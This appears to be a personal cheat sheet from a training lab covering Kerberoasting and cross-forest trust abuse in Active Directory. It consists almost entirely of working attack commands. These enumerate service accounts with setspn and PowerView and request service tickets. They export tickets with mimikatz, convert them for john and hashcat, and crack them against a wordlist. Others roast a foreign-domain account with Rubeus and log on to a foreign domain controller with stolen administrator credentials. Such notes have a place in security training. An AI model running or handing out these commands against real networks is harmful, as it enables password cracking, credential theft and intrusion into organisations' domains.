

Enumerate SPN's via setspn
```cmd-session
setspn.exe -Q */*
```

Request All Tickets via setspn
```powershell-session
Add-Type -AssemblyName System.IdentityModel

setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Request TGS for User Account
```powershell-session
Add-Type -AssemblyName System.IdentityModel
```
```powershell-session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Request TGS for User Account via powershell
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```


Extracting Tickets with mimikatz
```cmd-session
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```
Converting mimikatz base64 blob for cracking
```shell-session
echo "<base64 blob>" |  tr -d \\n
```

Convert base64 file to kirbi file
```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

Extracting kirbi with john
```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```

Convert kirbi for hashcat from john format
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Cracking kirbi with hashcat
```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

Request tickets with powershell
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

Extracting tickets to csv files
```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Check for encryption type 0 = rc4 24 = aes with powerview
```powershell-session

Import-Module .\PowerView.ps1

Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Path to supported encryption types
```Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options```

Get ticket with powerview
```Import-Module .\PowerView.ps1```
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```


#### Cross Forest Trust Abuse


(powerview)Enumerating Accounts for Associated SPNs Using Get-DomainUser
```powershell-session
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

(powerview)Enumerating Account for group partnership
```powershell-session
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

Kerberoasting with specified domain for TGS hash
```powershell-session
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

(powerview)Find accounts not part of local domain
```powershell-session
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

(winrm)Accessing DC of foreign group account
```powershell-session
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
